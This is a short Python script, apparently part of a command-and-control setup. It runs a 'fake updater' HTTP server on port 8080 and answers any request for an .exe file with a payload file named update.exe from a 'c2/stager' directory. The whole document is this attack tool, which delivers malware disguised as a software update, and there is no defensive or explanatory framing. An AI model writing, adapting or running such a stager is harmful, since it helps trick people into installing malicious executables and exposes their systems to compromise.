from http.server import SimpleHTTPRequestHandler, HTTPServer
import os

class UpdateHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith(".exe"):
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            with open("payloads/update.exe", "rb") as file:
                self.wfile.write(file.read())
        else:
            self.send_response(404)
            self.end_headers()

def run():
    os.chdir("c2/stager")
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, UpdateHandler)
    print("[+] Fake updater server started on port 8080")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
